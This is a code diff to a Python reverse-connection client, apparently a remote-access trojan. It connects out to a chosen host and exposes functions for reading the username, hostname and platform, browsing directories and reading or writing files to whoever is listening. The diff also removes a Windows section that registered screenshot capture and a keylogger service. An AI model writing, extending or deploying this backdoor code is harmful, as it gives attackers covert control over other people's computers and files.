@@ -1,5 +1,6 @@
 # -*- coding: utf-8 -*-
 
+import platform
 import socket
 import socketserver
 import sys
@@ -81,57 +82,68 @@ class FileService(payload.FileOpener, payload.FileReader, payload.FileWriter):
     pass
 
 
-def init_payload(client):
-    # TODO: for f in payload.__all__ ...
-    funcs = [
-            payload.get_username,
-            payload.get_hostname,
-            payload.get_platform,
-            payload.list_dir,
-            payload.change_dir,
-            payload.get_current_dir,
-            payload.get_file_size,
-            payload.uname,
-    ]
-    for f in funcs:
-        client.register_function(f)
-    client.register_instance(FileService())
-    if 'win' in sys.platform:
-        init_windows_payload(client)
+def windows_main():
+    raise NotImplementedError
 
 
-def init_windows_payload(client):
-    # TODO: for f in payload.windows.__all__ ...
-    funcs = [
-            payload.windows.screenshot,
-    ]
-    for f in funcs:
-        client.register_function(f)
-    client.register_instance(payload.windows.KeyloggerService())
-
-
-if __name__ == '__main__':
+def linux_main():
     import argparse
 
     parser = argparse.ArgumentParser()
-    parser.add_argument('host',
+    subparsers = parser.add_subparsers(
+            dest='subcommand',
+            metavar='subcommand',
+    )
+    subparsers.required = True
+
+    connect_parser = subparsers.add_parser('connect')
+    connect_parser.add_argument('host',
             help='the host name or ip address to connect to. '
                  '[default: localhost]',
             default='localhost',
             nargs='?',
     )
-    parser.add_argument('--port', '-p',
+    connect_parser.add_argument('--port', '-p',
             help='the port number to connect to. '
                  '[default: 8000]',
             default=8000,
     )
+
     args = parser.parse_args()
     host, port = addr = args.host, args.port
 
     with ReverseClient(addr) as client:
-        init_payload(client)
+        funcs = [
+                payload.get_username,
+                payload.get_hostname,
+                payload.get_platform,
+                payload.list_dir,
+                payload.change_dir,
+                payload.get_current_dir,
+                payload.get_file_size,
+                payload.uname,
+        ]
+        for f in funcs:
+            client.register_function(f)
+        client.register_instance(FileService())
         try:
             client.serve_forever()
         except connection.ConnectionClosed:
             pass
+
+
+if platform.system() == 'Windows':
+    main = windows_main
+elif platform.system() == 'Linux':
+    main = linux_main
+else:
+    def main():
+        raise NotImplementedError
+
+
+if __name__ == '__main__':
+    try:
+        main()
+    except NotImplementedError:
+        print('*** Platform not supported: {}'.format(platform.system()))
 
